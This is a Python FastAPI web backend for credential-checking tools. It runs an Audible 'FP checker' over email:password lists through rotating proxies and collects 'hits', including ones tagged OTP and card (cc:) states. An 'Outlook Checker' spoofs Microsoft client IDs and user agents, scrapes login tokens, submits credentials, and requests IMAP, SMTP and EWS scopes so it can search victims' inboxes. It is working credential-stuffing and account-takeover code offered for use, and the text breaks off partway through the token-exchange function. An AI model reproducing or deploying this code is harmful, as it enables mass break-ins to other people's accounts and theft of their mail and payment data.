#!/usr/bin/env python3
"""FastAPI control plane for the Audible FP Checker (iftools — audible only)."""
from __future__ import annotations

import asyncio
import collections
import json
import logging
import os
import re
import secrets
import shutil
import sys
import threading
import time
from pathlib import Path
from typing import Any, Deque, Dict, List, Optional, Tuple

from fastapi import FastAPI, Header, HTTPException, Query, Request
from fastapi.responses import FileResponse, JSONResponse, Response, StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, Field

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

DIST = ROOT / "frontend" / "dist"
RESULTS_FILE = ROOT / "audible_results.txt"


def _load_dotenv() -> None:
    """Minimal .env loader (stdlib only): KEY=VALUE, # comments, quoted values."""
    env_file = ROOT / ".env"
    if not env_file.is_file():
        return
    for line in env_file.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, _, val = line.partition("=")
        key, val = key.strip(), val.strip().strip("'\"")
        if key and key not in os.environ:
            os.environ[key] = val


_load_dotenv()

# Auth like n8n/WAHA: username+password from .env for self-hosting/production.
AUTH_USERNAME = (os.getenv("GITHUB_REGISTER_USERNAME") or "").strip()
AUTH_PASSWORD = (os.getenv("GITHUB_REGISTER_PASSWORD") or "").strip()
ACCESS_PASSWORD = AUTH_PASSWORD or (os.getenv("GITHUB_REGISTER_ACCESS_PASSWORD") or "").strip()
AUTH_ENABLED = bool(ACCESS_PASSWORD)
# ponytail: read the real IP from X-Forwarded-For only behind a trusted
# proxy (spoofable when directly exposed). Compose sets =1.
TRUST_PROXY = (os.getenv("GITHUB_REGISTER_TRUST_PROXY") or "").strip().lower() in (
    "1", "true", "yes")
HOST = (os.getenv("GITHUB_REGISTER_HOST") or "127.0.0.1").strip()
PORT = int(os.getenv("GITHUB_REGISTER_PORT") or "8093")

if AUTH_ENABLED and HOST in ("0.0.0.0", "::"):
    logging.getLogger("uvicorn.error").warning(
        "exposed on %s — make sure GITHUB_REGISTER_USERNAME/PASSWORD is strong + HTTPS reverse proxy",
        HOST,
    )

app = FastAPI(
    title="Audible FP Checker",
    version="2.0.0",
    # ponytail: hide public swagger when auth is on (like n8n/waha); back on for dev without auth
    docs_url=None if AUTH_ENABLED else "/docs",
    redoc_url=None if AUTH_ENABLED else "/redoc",
    openapi_url=None if AUTH_ENABLED else "/openapi.json",
)

_AUTH_MAX_BODY = 8 * 1024  # /api/auth is only username+password; reject jumbo before reading (DoS)


@app.middleware("http")
async def _security_guard(request: Request, call_next):
    if request.url.path == "/api/auth":
        try:
            if int(request.headers.get("content-length") or 0) > _AUTH_MAX_BODY:
                return JSONResponse({"ok": False, "detail": "request too large"}, status_code=413)
        except ValueError:
            pass
    resp = await call_next(request)
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["X-Frame-Options"] = "DENY"  # admin console must not be iframed (clickjacking)
    resp.headers["Referrer-Policy"] = "no-referrer"
    if request.url.path.startswith("/api/"):
        resp.headers["Cache-Control"] = "no-store"
    return resp


class _QuietSSECancellation(logging.Filter):
    """Suppress "Exception in ASGI application" tracebacks that are just
    CancelledError from tasks being torn down at shutdown (Ctrl+C).

    Two shapes occur:
      * uvicorn's http protocol logs CancelledError with exc_info when a
        StreamingResponse task (e.g. our /api/logs SSE stream) is cancelled;
      * starlette's lifespan handler formats CancelledError into a plain-text
        traceback message (no exc_info) and uvicorn logs it as an ERROR.
    Neither is an error — it is normal shutdown noise.
    """

    def filter(self, record: logging.LogRecord) -> bool:
        if record.levelno != logging.ERROR:
            return True
        if record.exc_info:
            exc = record.exc_info[1]
            if isinstance(exc, asyncio.CancelledError):
                return False
            if isinstance(exc, BaseExceptionGroup) and not exc.split(asyncio.CancelledError)[1]:
                return False  # every sub-exception is a CancelledError
        msg = record.getMessage()
        if "CancelledError" in msg and "Traceback (most recent call last)" in msg:
            return False  # formatted CancelledError traceback text
        return True


logging.getLogger("uvicorn.error").addFilter(_QuietSSECancellation())

# --------------------------------------------------------------------------- #
# In-memory log ring buffer + SSE fan-out (shared by the job runner + UI)
# --------------------------------------------------------------------------- #
_log_buffer: Deque[str] = collections.deque(maxlen=2000)
_log_seq = 0
_log_cond = threading.Condition()


def _append_log(message: str) -> None:
    global _log_seq
    line = f"[{time.strftime('%H:%M:%S')}] {message}"
    with _log_cond:
        _log_buffer.append(line)
        _log_seq += 1
        _log_cond.notify_all()


# --------------------------------------------------------------------------- #
# Auth: constant-time compare + in-memory sessions + per-IP rate limit
# --------------------------------------------------------------------------- #
_sessions: Dict[str, float] = {}
_SESSION_LOCK = threading.Lock()
_SESSION_TTL = 86400 * 7

# ponytail: in-memory per-IP rate-limit for /api/auth (anti brute-force);
# enough for single-user self-host, use a reverse-proxy limit for multi-replica
_AUTH_FAILS: Dict[str, Deque[float]] = {}
_AUTH_LOCK = threading.Lock()
_AUTH_MAX_ATTEMPTS = 10
_AUTH_WINDOW_SEC = 60.0


def _safe_compare(a: str, b: str) -> bool:
    """compare_digest without 500: non-ASCII/odd input = not valid credentials."""
    try:
        import hmac

        return hmac.compare_digest(a, b)
    except Exception:
        return False


def _require_auth(x_access_key: Optional[str]) -> None:
    if not AUTH_ENABLED:
        return
    key = (x_access_key or "").strip()
    if not key:
        raise HTTPException(status_code=401, detail="access key required")
    with _SESSION_LOCK:
        exp = _sessions.get(key)
        if exp and exp > time.time():
            return
        if exp:
            _sessions.pop(key, None)
    raise HTTPException(status_code=403, detail="invalid access key")


def _valid_credential(username: str, password: str) -> bool:
    # ponytail: always run both compares (no short-circuit) so timing
    # does not leak valid vs invalid username
    user_ok = _safe_compare(username, AUTH_USERNAME) if AUTH_USERNAME else True
    pass_ok = _safe_compare(password, ACCESS_PASSWORD)
    return bool(user_ok and pass_ok)


def _client_ip(request: Request) -> str:
    if TRUST_PROXY:
        xff = (request.headers.get("x-forwarded-for") or "").split(",")[0].strip()
        if xff:
            return xff
    return request.client.host if request.client else "unknown"


def _auth_rate_limited(ip: str) -> float:
    """Record 1 failed attempt; return wait seconds (>0 = rejected). Sliding window."""
    now = time.time()
    with _AUTH_LOCK:
        attempts = _AUTH_FAILS.setdefault(ip, collections.deque())
        while attempts and now - attempts[0] > _AUTH_WINDOW_SEC:
            attempts.popleft()
        if len(attempts) >= _AUTH_MAX_ATTEMPTS:
            return max(1.0, _AUTH_WINDOW_SEC - (now - attempts[0]))
        attempts.append(now)
        return 0.0


def _auth_reset(ip: str) -> None:
    with _AUTH_LOCK:
        _AUTH_FAILS.pop(ip, None)


def _issue_token() -> str:
    token = secrets.token_urlsafe(32)
    with _SESSION_LOCK:
        _sessions[token] = time.time() + _SESSION_TTL
    return token


class AuthBody(BaseModel):
    username: str = ""
    password: str = ""


# --------------------------------------------------------------------------- #
# Audible FP checker
# --------------------------------------------------------------------------- #
_AUDIBLE_STATE: Dict[str, Any] = {
    "running": False,
    "done": False,
    "total": 0,
    "hits": 0,
    "fails": 0,
    "checks": 0,
    "results": [],
    "error": "",
    "started_at": None,
    "finished_at": None,
}
_AUDIBLE_LOCK = threading.Lock()
_AUDIBLE_STOP = threading.Event()


class AudibleBody(BaseModel):
    accounts: List[str] = Field(..., min_length=1)
    speed: str = Field("normal", pattern="^(slow|normal|fast|maximum)$")
    proxy_file: Optional[str] = None
    workers: Optional[int] = None
    limit: Optional[int] = None


def _audible_reset(total: int) -> None:
    with _AUDIBLE_LOCK:
        _AUDIBLE_STATE.update(
            running=True,
            done=False,
            total=total,
            hits=0,
            fails=0,
            checks=0,
            results=[],
            error="",
            started_at=time.time(),
            finished_at=None,
        )
        _AUDIBLE_STOP.clear()


def _audible_add_result(email: str, password: str, status: str, note: str) -> None:
    with _AUDIBLE_LOCK:
        # Dedup: keep latest entry per email, undo old counter first.
        existing_idx = next(
            (i for i, r in enumerate(_AUDIBLE_STATE["results"]) if r["email"] == email),
            None,
        )
        entry = {"email": email, "password": password, "status": status, "note": note}
        if existing_idx is not None:
            old = _AUDIBLE_STATE["results"][existing_idx]
            if old["status"] == "ok":
                _AUDIBLE_STATE["hits"] = max(0, _AUDIBLE_STATE["hits"] - 1)
            elif old["status"] == "fail":
                _AUDIBLE_STATE["fails"] = max(0, _AUDIBLE_STATE["fails"] - 1)
            else:
                _AUDIBLE_STATE["checks"] = max(0, _AUDIBLE_STATE["checks"] - 1)
            _AUDIBLE_STATE["results"][existing_idx] = entry
        else:
            _AUDIBLE_STATE["results"].append(entry)
        if status == "ok":
            _AUDIBLE_STATE["hits"] += 1
        elif status == "fail":
            _AUDIBLE_STATE["fails"] += 1
        else:
            _AUDIBLE_STATE["checks"] += 1


def _run_audible(
    accounts: List[Tuple[str, str]],
    speed: str,
    proxy_file: Optional[str],
    workers: Optional[int],
    limit: Optional[int],
) -> None:
    """Run the Audible FP checker in a background thread."""
    import subprocess
    import tempfile

    tmpdir = Path(tempfile.mkdtemp(prefix="iftools_audible_"))
    try:
        batch_path = tmpdir / "accounts.txt"
        with open(batch_path, "w", encoding="utf-8") as fh:
            for em, pw in accounts:
                fh.write(f"{em}:{pw}\n")
        proxy_path = None
        if proxy_file:
            proxy_path = tmpdir / "proxies.txt"
            # proxy_file may be either raw content (from browser upload) or a path.
            # Guard Path() against OS filename-too-long (Errno 36) on large content strings.
            is_path = False
            if len(proxy_file) < 512 and "\n" not in proxy_file:
                try:
                    src = Path(proxy_file)
                    is_path = src.is_file()
                except OSError:
                    is_path = False
            if is_path:
                with open(proxy_path, "w", encoding="utf-8") as fh:
                    fh.write(open(src, "r", encoding="utf-8", errors="replace").read())  # type: ignore[name-defined]
                _append_log(f"[*] audible: proxy list loaded from file ({src.name})")  # type: ignore[name-defined]
            else:
                # Raw content sent from browser
                with open(proxy_path, "w", encoding="utf-8") as fh:
                    fh.write(proxy_file)
                n = len([l for l in proxy_file.splitlines() if l.strip()])
                _append_log(f"[*] audible: proxy list written from content ({n} lines)")

        script = Path(__file__).resolve().parent.parent / "audible_fp_runner.py"
        # The checker needs its own venv (playwright + deps live there, not in
        # whatever interpreter is running this web service).
        project_venv = Path(__file__).resolve().parent.parent / ".venv" / "bin" / "python"
        runner_python = str(project_venv) if project_venv.is_file() else sys.executable
        cmd = [
            runner_python,
            str(script),
            "--batch",
            str(batch_path),
            "--speed",
            speed,
            "--out-dir",
            str(tmpdir),
        ]
        if proxy_path:
            cmd += ["--proxy-file", str(proxy_path)]
        if workers:
            cmd += ["--workers", str(workers)]
        if limit:
            cmd += ["--limit", str(limit)]

        _append_log(f"[*] audible: starting {len(accounts)} accounts (speed={speed})")
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            cwd=str(tmpdir),
            bufsize=1,
        )
        assert proc.stdout is not None
        for line in proc.stdout:
            line = line.rstrip("\n")
            if not line:
                continue
            _append_log(f"[audible] {line}")
            # The runner prints each result twice: a progress line
            # "[ 1/3] (33%) user → label" and a raw "user:pw (label)" dump at
            # the end. Only count the progress line; the dump would double
            # every row in /api/audible/status.
            if not re.match(r"^\[\s*\d+/\d+\]", line):
                parsed = None
            else:
                parsed = _audible_parse_line(line)
            if parsed:
                _audible_add_result(*parsed)
            if _AUDIBLE_STOP.is_set():
                proc.terminate()
                break
        proc.wait()
        _append_log(f"[*] audible: process exited rc={proc.returncode}")
    except Exception as exc:  # noqa: BLE001
        _append_log(f"[-] audible: {exc}")
        with _AUDIBLE_LOCK:
            _AUDIBLE_STATE["error"] = str(exc)
    finally:
        # Carry over hits to the persistent results file BEFORE cleaning up tmpdir.
        try:
            src = tmpdir / "results.txt"
            if src.exists():
                with open(src, "r", encoding="utf-8") as fh:
                    data = fh.read()
                with open(RESULTS_FILE, "a", encoding="utf-8") as fh:
                    fh.write(data)
        except Exception:  # noqa: BLE001
            pass
        # Now safe to remove scratch dir.
        try:
            shutil.rmtree(tmpdir, ignore_errors=True)
        except Exception:
            pass
        with _AUDIBLE_LOCK:
            _AUDIBLE_STATE["running"] = False
            _AUDIBLE_STATE["done"] = True
            _AUDIBLE_STATE["finished_at"] = time.time()
        _append_log("[*] audible: job finished")


def _audible_parse_line(line: str) -> Optional[Tuple[str, str, str, str]]:
    """Best-effort parse of one audible_fp stdout line into a result tuple.

    Runner emits two shapes:
      [  12/40] (30.0%) user@host.de → OTP_SMS:xxx-xxx-xx51
      user@host.de:password (fail:no_otp)
    """
    m = re.match(
        r"^(?:\[\s*\d+/\d+\]\s*\([^)]*\)\s*)?([^\s:]+):(\S+)\s*\((.+)\)\s*$",
        line,
    )
    if not m:
        m2 = re.match(
            r"^(?:\[\s*(\d+)/(\d+)\]\s*\([^)]*\)\s*)([^\s→:]+)\s*→\s*(.+)$",
            line,
        )
        if not m2:
            return None
        email, note = m2.group(3).strip(), m2.group(4).strip()
        password = ""
    else:
        email, password, note = m.group(1).strip(), m.group(2), m.group(3).strip()
    note_l = note.lower()
    if "fail" in note_l or "bad" in note_l or "error" in note_l:
        status = "fail"
    elif ("otp_sms" in note_l or "otp_wa" in note_l or "otp_email" in note_l or note_l == "otp"
           or "hit" in note_l or note_l.startswith("ok")
           or note_l in ("v2l",) or note_l.startswith("dcq") or note_l.startswith("cc:")
           or note_l.startswith("push_notif")):
        status = "ok"
    else:
        status = "check"
    return email, password, status, note


def _restore_audible_results() -> None:
    """Rebuild the in-memory result list from the persisted results file.

    The web service keeps results in memory only, so a restart would wipe the
    table and disable Download even though the file still holds everything.
    """
    if not RESULTS_FILE.exists():
        return
    seen: set = set()
    hits = fails = checks = 0
    for ln in RESULTS_FILE.read_text(encoding="utf-8").splitlines():
        ln = ln.strip()
        if not ln:
            continue
        parsed = _audible_parse_line(ln)
        if not parsed:
            continue
        email, password, status, note = parsed
        if email in seen:
            continue  # keep the FIRST occurrence (matches live-run ordering)
        seen.add(email)
        _AUDIBLE_STATE["results"].append(
            {"email": email, "password": password, "status": status, "note": note}
        )
        if status == "ok":
            hits += 1
        elif status == "fail":
            fails += 1
        else:
            checks += 1
    _AUDIBLE_STATE["hits"] = hits
    _AUDIBLE_STATE["fails"] = fails
    _AUDIBLE_STATE["checks"] = checks
    _AUDIBLE_STATE["total"] = len(seen)
    _AUDIBLE_STATE["done"] = True
    _AUDIBLE_STATE["finished_at"] = RESULTS_FILE.stat().st_mtime


_restore_audible_results()


@app.post("/api/audible/start")
async def api_audible_start(
    body: AudibleBody, x_access_key: Optional[str] = Header(None)
) -> Dict[str, Any]:
    _require_auth(x_access_key)
    with _AUDIBLE_LOCK:
        if _AUDIBLE_STATE["running"]:
            raise HTTPException(status_code=409, detail="audible job already running")
    accounts: List[Tuple[str, str]] = []
    for line in body.accounts:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(":", 1)
        if len(parts) != 2:
            continue
        accounts.append((parts[0].strip(), parts[1].strip()))
    if not accounts:
        raise HTTPException(status_code=400, detail="no valid email:password lines")
    if body.limit:
        accounts = accounts[: body.limit]
    _audible_reset(len(accounts))
    threading.Thread(
        target=_run_audible,
        args=(accounts, body.speed, body.proxy_file, body.workers, body.limit),
        daemon=True,
    ).start()
    return {"ok": True, "started": True, "total": len(accounts)}


@app.post("/api/audible/stop")
async def api_audible_stop(x_access_key: Optional[str] = Header(None)) -> Dict[str, Any]:
    _require_auth(x_access_key)
    _AUDIBLE_STOP.set()
    _append_log("[!] audible stop requested from web")
    return {"ok": True, "stopped": True}


@app.get("/api/audible/status")
async def api_audible_status(x_access_key: Optional[str] = Header(None)) -> Dict[str, Any]:
    _require_auth(x_access_key)
    with _AUDIBLE_LOCK:
        return {"ok": True, **_AUDIBLE_STATE}


def _note_of(line: str) -> str:
    """Extract the "(...)" detail from a results line, '' if absent."""
    m = re.search(r"\(([^()]*)\)\s*$", line)
    return m.group(1).strip() if m else ""


def _audible_classify(note: str) -> str:
    """Map a result note to a download bucket. Mirrors _audible_parse_line."""
    n = (note or "").strip().lower()
    if "fail" in n or "bad" in n or "error" in n:
        return "fail"
    if (n.startswith("otp_sms") or n.startswith("otp_wa") or n.startswith("otp_email")
            or n.startswith("otp") or "hit" in n or n.startswith("ok")):
        return "otp"
    if n.startswith("v2l"):
        return "v2l"
    if n.startswith("dcq") or n.startswith("cc:") or n.startswith("push_notif"):
        return "dcq"
    return "check"


@app.get("/api/audible/results")
async def api_audible_results(
    x_access_key: Optional[str] = Header(None),
    kind: str = Query("all", pattern="^(all|hits|otp|v2l|dcq|check|fail)(,(all|hits|otp|v2l|dcq|check|fail))*$"),
    meta: str = Query("0", pattern="^(0|1)$"),
) -> Response:
    _require_auth(x_access_key)
    if not RESULTS_FILE.exists():
        return Response(content="", media_type="text/plain")
    keep_detail = meta == "1"
    # The file is appended on every run, so the same account can appear many
    # times with different labels. Keep only the LATEST line per email.
    latest: dict[str, str] = {}
    for ln in RESULTS_FILE.read_text(encoding="utf-8").splitlines():
        ln = ln.strip()
        if not ln:
            continue
        latest[ln.split(":", 1)[0]] = ln

    def emit(line: str) -> str:
        if keep_detail:
            return line
        # credentials-only: drop the trailing " (label)" detail
        m = re.match(r"^([^:]+:\S+?)(?:\s+\([^)]*\))?\s*$", line)
        return m.group(1) if m else line

    kinds = [k for k in (kind or "").split(",") if k]
    buckets = set(kinds) if kinds and kinds != ["all"] else None

    def wanted(line: str) -> bool:
        if buckets is None or "all" in buckets:
            return True
        if "hits" in buckets:
            return _audible_classify(_note_of(line)) != "fail"
        return _audible_classify(_note_of(line)) in buckets

    out = [emit(v) for v in latest.values() if wanted(v)]
    return Response(content="\n".join(out), media_type="text/plain")


@app.get("/api/audible/accounts")
async def api_audible_accounts(
    x_access_key: Optional[str] = Header(None),
) -> Dict[str, Any]:
    """Audible accounts parsed from results.txt as rows for the accounts list."""
    _require_auth(x_access_key)
    rows: List[Dict[str, Any]] = []
    if RESULTS_FILE.exists():
        for ln in RESULTS_FILE.read_text(encoding="utf-8").splitlines():
            ln = ln.strip()
            if not ln or ln.startswith("#"):
                continue
            m = re.match(r"^([^:]+):(\S*)\s*\((.*)\)\s*$", ln)
            if not m:
                continue
            email, pw, note = m.group(1).strip(), m.group(2), m.group(3).strip()
            note_l = note.lower()
            status = (
                "fail"
                if ("fail" in note_l or "bad" in note_l or "error" in note_l)
                else "ok"
                if ("otp_sms" in note_l or "otp_wa" in note_l or "otp_email" in note_l
                    or "hit" in note_l or note_l.startswith("v2l")
                    or note_l.startswith("dcq") or note_l.startswith("cc:")
                    or note_l.startswith("push_notif"))
                else "check"
            )
            rows.append(
                {
                    "email": email,
                    "password": pw,
                    "status": status,
                    "note": note,
                    "source": "audible",
                }
            )
    return {"ok": True, "total": len(rows), "items": rows}


# --------------------------------------------------------------------------- #
# Proxy list upload (the runner reads proxies.txt at the project root)
# --------------------------------------------------------------------------- #


def _valid_proxy_line(line: str) -> bool:
    """scheme://user:pass@host:port — any scheme, port required, host required."""
    from urllib.parse import urlsplit

    try:
        parts = urlsplit(line)
    except ValueError:
        return False
    return bool(parts.scheme and parts.hostname and parts.port)


@app.post("/api/proxy/upload")
async def api_proxy_upload(
    request: Request, x_access_key: Optional[str] = Header(None)
) -> Dict[str, Any]:
    """Save an uploaded proxy list as the active pool (proxies.txt, one URL per line).

    Body: raw file content (text/plain) — no multipart needed.
    """
    _require_auth(x_access_key)
    raw = (await request.body()).decode("utf-8", errors="replace")
    valid: List[str] = []
    seen: set = set()
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line in seen or not _valid_proxy_line(line):
            continue
        seen.add(line)
        valid.append(line)
    if not valid:
        raise HTTPException(
            status_code=400,
            detail="no valid proxies found (one per line: scheme://user:pass@host:port)",
        )
    (ROOT / "proxies.txt").write_text("\n".join(valid) + "\n", encoding="utf-8")
    _append_log(f"[*] proxy pool uploaded: {len(valid)} proxies -> proxies.txt")
    return {"ok": True, "proxy_file": "proxies.txt", "count": len(valid)}


# --------------------------------------------------------------------------- #
# Streaming log endpoints (SSE)
# --------------------------------------------------------------------------- #
@app.get("/api/logs")
async def api_logs(
    request: Request,
    x_access_key: Optional[str] = Header(None),
    after: int = Query(0, ge=0),
):
    _require_auth(x_access_key)

    async def event_stream():
        last = after
        try:
            while True:
                if await request.is_disconnected():
                    break
                with _log_cond:
                    buf = list(_log_buffer)
                    seq = _log_seq
                if seq > last:
                    start_idx = max(0, len(buf) - (seq - last))
                    for line in buf[start_idx:]:
                        yield f"data: {line}\n\n"
                    last = seq
                await asyncio.sleep(0.5)
        except (asyncio.CancelledError, asyncio.TimeoutError):
            # client went away / server shutdown — exit the stream quietly;
            # uvicorn would otherwise log "Exception in ASGI application"
            pass

    return StreamingResponse(event_stream(), media_type="text/event-stream")


@app.get("/api/logs/snapshot")
async def api_logs_snapshot(
    x_access_key: Optional[str] = Header(None),
    limit: int = Query(200, ge=1, le=2000),
) -> Dict[str, Any]:
    _require_auth(x_access_key)
    with _log_cond:
        lines = list(_log_buffer)[-limit:]
        seq = _log_seq
    return {"ok": True, "seq": seq, "lines": lines}


# --------------------------------------------------------------------------- #
# Outlook Checker — OAuth2 bruter + inbox searcher
# --------------------------------------------------------------------------- #
import urllib.parse as _up

_MSFT_CLIENT_ID    = "0000000048170EF2"
_MSFT_REDIRECT_URI = "https://login.live.com/oauth20_desktop.srf"
_MSFT_TENANT_CONS  = "consumers"
_MSFT_TENANT_ID    = "9188040d-6c67-4c5b-b112-36a304b66dad"
_MSFT_UA_BROWSER   = (
    "Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.0.0 Mobile Safari/537.36"
)
_MSFT_UA_MSAL    = "Mozilla/5.0 (compatible; MSAL 1.0)"
_MSFT_UA_DALVIK  = "Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)"
_MSFT_SCOPE_LOGIN = "offline_access openid profile service::outlook.office.com::MBI_SSL"
_MSFT_SCOPE_EWS   = (
    "offline_access https://outlook.office.com/IMAP.AccessAsUser.All "
    "https://outlook.office.com/SMTP.Send https://outlook.office.com/EWS.AccessAsUser.All"
)
_MSFT_SCOPE_SUBSTRATE = "offline_access https://substrate.office.com/.default"
_MSFT_MSAL_HDR = {
    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
    "User-Agent": _MSFT_UA_MSAL,
    "client-request-id": "3d0f0eea-617a-4b9c-a747-100934dca583",
    "return-client-request-id": "false",
}
_MSFT_TIMEOUT = 20

_OUTLOOK_RESULTS_FILE = ROOT / "outlook_results.txt"

_OUTLOOK_STATE: Dict[str, Any] = {
    "running": False, "done": False, "total": 0,
    "hits": 0, "bad": 0, "found": 0, "retries": 0,
    "results": [], "error": "", "mode": "bruter",
    "keyword": "", "sender": "", "date_from": "", "date_to": "",
    "started_at": None, "finished_at": None,
}
_OUTLOOK_LOCK = threading.Lock()
_OUTLOOK_STOP = threading.Event()


class OutlookBody(BaseModel):
    accounts: List[str] = Field(..., min_length=1)
    mode: str = Field("bruter", pattern="^(bruter|inboxer)$")
    keyword: Optional[str] = None
    sender: Optional[str] = None
    date_from: Optional[str] = None
    date_to: Optional[str] = None
    proxy_file: Optional[str] = None
    workers: Optional[int] = None


def _outlook_reset(total: int, mode: str, keyword: str, sender: str = "",
                   date_from: str = "", date_to: str = "") -> None:
    with _OUTLOOK_LOCK:
        _OUTLOOK_STATE.update(
            running=True, done=False, total=total,
            hits=0, bad=0, found=0, retries=0,
            results=[], error="", mode=mode, keyword=keyword, sender=sender,
            date_from=date_from, date_to=date_to,
            started_at=time.time(), finished_at=None,
        )
        _OUTLOOK_STOP.clear()


def _outlook_add_result(email: str, password: str, status: str,
                        name: str, country: str, found: int) -> None:
    with _OUTLOOK_LOCK:
        existing = next(
            (i for i, r in enumerate(_OUTLOOK_STATE["results"]) if r["email"] == email), None
        )
        entry = {"email": email, "password": password, "status": status,
                 "name": name, "country": country, "found": found}
        if existing is not None:
            old = _OUTLOOK_STATE["results"][existing]
            if old["status"] == "hit":   _OUTLOOK_STATE["hits"]  = max(0, _OUTLOOK_STATE["hits"] - 1)
            elif old["status"] == "bad": _OUTLOOK_STATE["bad"]   = max(0, _OUTLOOK_STATE["bad"]  - 1)
            if old.get("found", 0) > 0:  _OUTLOOK_STATE["found"] = max(0, _OUTLOOK_STATE["found"] - 1)
            _OUTLOOK_STATE["results"][existing] = entry
        else:
            _OUTLOOK_STATE["results"].append(entry)
        if status == "hit":
            _OUTLOOK_STATE["hits"] += 1
        else:
            _OUTLOOK_STATE["bad"] += 1
            try:
                bad_path = _OUTLOOK_RESULTS_FILE.parent / "outlook_bad.txt"
                with open(bad_path, "a", encoding="utf-8") as fh:
                    fh.write(f"{email}:{password} | Status: bad\n")
            except OSError:
                pass
        if found > 0:
            _OUTLOOK_STATE["found"] += 1


def _restore_outlook_results() -> None:
    """Rebuild outlook state from the persisted files after a restart."""
    if not _OUTLOOK_RESULTS_FILE.exists():
        return
    seen: set = set()
    hits = bad = found = 0
    inbox_path = _OUTLOOK_RESULTS_FILE.parent / "outlook_inbox.txt"
    inbox_lines: Dict[str, str] = {}
    if inbox_path.exists():
        for ln in inbox_path.read_text(encoding="utf-8").splitlines():
            ln = ln.strip()
            if not ln:
                continue
            m = re.match(r"^([^:]+):(\S*)\s*\|\s*Name:\s*([^|]*?)\s*\|\s*Country:\s*([^|]*?)\s*(?:\|\s*Found:\s*(\d+))?\s*$", ln)
            if not m:
                continue
            em, pw = m.group(1).strip(), m.group(2)
            inbox_lines[em] = ln
            if em in seen:
                continue
            seen.add(em)
            _OUTLOOK_STATE["results"].append({
                "email": em, "password": pw, "status": "hit",
                "name": m.group(3).strip(), "country": m.group(4).strip(),
                "found": int(m.group(5) or 0),
            })
            hits += 1
            if int(m.group(5) or 0) > 0:
                found += 1
    for ln in _OUTLOOK_RESULTS_FILE.read_text(encoding="utf-8").splitlines():
        ln = ln.strip()
        if not ln:
            continue
        m = re.match(r"^([^:]+):(\S*)\s*\|\s*Name:\s*([^|]*?)\s*\|\s*Country:\s*([^|]*?)\s*$", ln)
        if not m:
            continue
        em, pw = m.group(1).strip(), m.group(2)
        if em in seen:
            continue
        seen.add(em)
        inbox_line = inbox_lines.get(em, "")
        fm = re.search(r"Found:\s*(\d+)", inbox_line)
        _OUTLOOK_STATE["results"].append({
            "email": em, "password": pw, "status": "hit",
            "name": m.group(3).strip(), "country": m.group(4).strip(),
            "found": int(fm.group(1)) if fm else 0,
        })
        hits += 1
    _OUTLOOK_STATE["hits"] = hits
    _OUTLOOK_STATE["bad"] = bad
    _OUTLOOK_STATE["found"] = found
    _OUTLOOK_STATE["total"] = len(seen)
    _OUTLOOK_STATE["done"] = True
    _OUTLOOK_STATE["finished_at"] = _OUTLOOK_RESULTS_FILE.stat().st_mtime


_restore_outlook_results()


def _msft_login_page(session, email: str) -> Optional[Dict[str, str]]:
    """Fetch MS login page, return {url_post, ppft, nonce} or None."""
    url = (
        f"https://login.live.com/oauth20_authorize.srf"
        f"?client_id={_MSFT_CLIENT_ID}"
        f"&scope={_up.quote(_MSFT_SCOPE_LOGIN)}"
        f"&redirect_uri={_up.quote(_MSFT_REDIRECT_URI)}"
        f"&response_type=code&login_hint={_up.quote(email)}"
        f"&x-client-SKU=MSAL.xplat.android&x-client-Ver=1.1.0+ad8a8025"
        f"&uaid={int(time.time())}&msproxy=1&issuer=mso&tenant=consumers"
        f"&ui_locales=en-US&client_info=1&haschrome=1&passKeyAuth=1.0/passkey"
    )
    try:
        r = session.get(url, headers={"User-Agent": _MSFT_UA_BROWSER},
                        allow_redirects=True, timeout=_MSFT_TIMEOUT)
        md = re.search(r'var ServerData\s*=\s*(\{.*?\});\s*</script>', r.text, re.DOTALL) \
             or re.search(r'var ServerData\s*=\s*(\{.*?\});', r.text, re.DOTALL)
        if not md:
            return None
        sd = json.loads(md.group(1))
        url_post = sd.get("urlPost", "")
        ppft_m   = re.search(r'value="([^"]*)"', sd.get("sFTTag", ""))
        ppft     = ppft_m.group(1) if ppft_m else ""
        if not url_post or not ppft:
            return None
        return {"url_post": url_post, "ppft": ppft, "nonce": sd.get("sNGCNonce", "")}
    except Exception:
        return None


def _msft_submit_creds(session, url_post: str, ppft: str, nonce: str,
                        email: str, password: str) -> Optional[str]:
    """POST credentials, return auth code or None (bad password / block)."""
    payload = {
        "ps": "2", "psRNGCDefaultType": "1", "psRNGCEntropy": "", "psRNGCSLK": "",
        "canary": "", "ctx": nonce, "hpgrequestid": "",
        "PPFT": ppft, "PPSX": "Pas", "NewUser": "1", "FoundMSAs": "",
        "fspost": "0", "i21": "0", "CookieDisclosure": "0",
        "IsFidoSupported": "0", "isSignupPost": "0", "isRecoveryAttemptPost": "0",
        "i13": "1", "login": email, "loginfmt": email,
        "type": "11", "LoginOptions": "1",
        "lrt": "", "lrtPartition": "", "hisRegion": "", "hisScaleUnit": "",
        "passwd": password,
    }
    try:
        r = session.post(url_post, data=payload,
                         headers={"User-Agent": _MSFT_UA_BROWSER},
                         allow_redirects=False, timeout=_MSFT_TIMEOUT)
    except Exception:
        return None
    if r.status_code == 429:
        return None
    location = r.headers.get("Location", "")
    # 2026-09: MS returns 302+Location only on SUCCESS. On bad password it now
    # returns 200 + a re-rendered login page carrying sErrTxt (no redirect).
    # Treat any 200-without-Location as bad password — do NOT retry forever.
    if not location and r.status_code == 200:
        return None
    if not location:
        return None
    code = _up.parse_qs(_up.urlparse(location).query).get("code", [""])[0]
    if not code:
        m = re.search(r'code=([^&]+)', location)
        code = m.group(1) if m else ""
    return code or None


def _msft_exchange_code(session, code: str) -> Optional[Dict[str, str]]:
    """Exchange auth code → {refresh_token, substrate_token}."""
    r = session.post(
        f"https://login.microsoftonline.com/{_MSFT_TENANT_CONS}/oauth2/v2.0/token",
